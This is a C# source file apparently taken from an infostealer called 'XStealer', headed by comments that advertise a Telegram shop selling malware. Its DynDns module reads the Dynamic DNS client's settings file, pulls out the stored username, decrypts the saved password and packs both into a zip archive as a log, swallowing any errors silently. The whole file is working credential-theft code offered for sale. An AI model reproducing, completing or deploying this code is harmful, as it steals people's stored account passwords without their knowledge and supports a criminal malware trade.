// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Apps
{
    using System;
    using System.IO;
    using System.Linq;
    using Helpers;

    public static class DynDns
    {
        public static void Inizialize()
        {
            using var ms = new MemoryStream { Position = 0 };
            if (File.Exists(GlobalPaths.DynDns))
            {
                try
                {
                    string[] lines = File.ReadAllLines(GlobalPaths.DynDns);
                    if (lines.Any()) // lines.Length != 0
                    {
                        using var data = new StreamWriter(ms);
                        data.WriteLine($"UserName: {lines[1].Substring(9)}");
                        data.WriteLine($"Password: {DecoderEx.DecryptDns(lines[2].Substring(9))}\r\n");
                        data.Flush();
                    }
                }
                catch (Exception) { }
            }
            ZipEx.AddKeyPairStream("DynDns_Log.txt", ms?.ToArray() ?? ms.GetBuffer() ?? null);
        }
    }
}
